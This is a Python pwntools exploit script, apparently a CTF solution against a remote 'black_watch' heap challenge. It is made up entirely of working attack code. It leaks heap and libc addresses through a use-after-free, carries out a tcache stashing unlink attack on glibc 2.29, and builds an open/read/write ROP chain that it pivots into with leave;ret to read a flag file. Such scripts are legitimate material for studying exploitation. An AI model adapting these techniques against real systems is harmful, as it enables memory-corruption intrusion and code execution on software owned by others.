from pwn import *

#p = process('./black_watch')
p = remote('node4.buuoj.cn', 29152)
libc = ELF('libc-2.29.so')

context.arch = 'amd64'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.29/64/libc-2.29.debug.so
    ''' + s)

def alloc(index, size, content):
    sla(b'input: ', b'1')
    sla(b'idx:', str(index).encode())
    sla(b'0x400):', str(size))
    sa(b'content:', content)

def delete(index):
    sla(b'input: ', b'2')
    sla(b'idx:', str(index).encode())

def edit(index, content):
    sla(b'input: ', b'3')
    sla(b'idx:', str(index).encode())
    sa(b'content:', content)

def show(index):
    sla(b'input: ', b'4')
    sla(b'idx:', str(index).encode())

alloc(0, 4, b'a')
alloc(1, 4, b'a')

delete(0)
delete(1)

show(1)

p.recv()
heap_base = u64(rv(6).ljust(8, b'\x00')) - 0x1270
success('heap_base -> {}'.format(hex(heap_base)))

for i in range(5):
    alloc(0, 4, b'a')
    delete(0)

alloc(0, 4, b'a')

for i in range(6):
    alloc(1, 3, b'a')
    delete(1)

delete(0)

#leak libc
show(0)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

smallbin_1 = heap_base + 0x2fd0
fake_chunk_addr = heap_base + 0x4540
magic_heap = heap_base + 0x260 + 0x800 - 0x10
smallbin_main_arena = libc_base + libc.sym['__malloc_hook'] + 880
rop_chunk = heap_base + 0x2fe0

alloc(2, 2, b'a')
alloc(3, 4, p64(smallbin_1) + p64(magic_heap))

edit(0, b'a' * 0xf0 + p64(0) + p64(0x311) + p64(0x1234) + p64(fake_chunk_addr))

pop_rdi_ret = libc_base + 0x26542
pop_rsi_ret = libc_base + 0x26f9e
pop_rdx_ret = libc_base + 0x12bda6
open = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
leave_ret = libc_base + 0x58373

payload = b'flag' + b'\x00' * 4
payload += p64(pop_rdi_ret) + p64(rop_chunk)
payload += p64(pop_rsi_ret) + p64(0) + p64(open)
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(heap_base + 0x260)
payload += p64(pop_rdx_ret) + p64(0x40) + p64(read)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_ret) + p64(heap_base + 0x260)
payload += p64(pop_rdx_ret) + p64(0x40) + p64(write)

#tcache stashing unlink attack
alloc(4, 3, payload)

#punch
#debug('b *$rebase(0x1474)')
sla(b'input: ', b'666')
sa(b'What do you want to say?', b'a' * 0x80 + p64(rop_chunk) + p64(leave_ret))

p.interactive()